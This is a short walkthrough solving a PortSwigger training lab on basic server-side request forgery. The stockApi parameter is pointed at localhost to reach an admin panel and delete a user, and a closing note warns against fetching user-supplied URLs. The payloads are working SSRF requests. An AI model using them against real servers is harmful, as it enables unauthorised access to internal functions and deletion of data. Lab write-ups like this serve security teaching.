# Lab 01 — Basic SSRF against the local server

> **Apprentice** · [Official lab](https://portswigger.net/web-security/ssrf/basic-ssrf-against-local-server)

**Entry point:** `POST /product/stock` — form parameter `stockApi` is
requested server-side.

## Solution

1. Note the stock request:
   `stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D1%26storeId%3D1`
2. Point it at the local admin panel:

```
stockApi=http://localhost/admin
```

The admin UI renders in the response (SSRF = you browse as the server).

3. The delete link only works from localhost — which you already are:

```
stockApi=http://localhost/admin/delete?username=carlos
```

Lab solved.

## Notes

The admin panel trusts `localhost`; SSRF inherits that trust. Never fetch
raw URLs supplied by users.
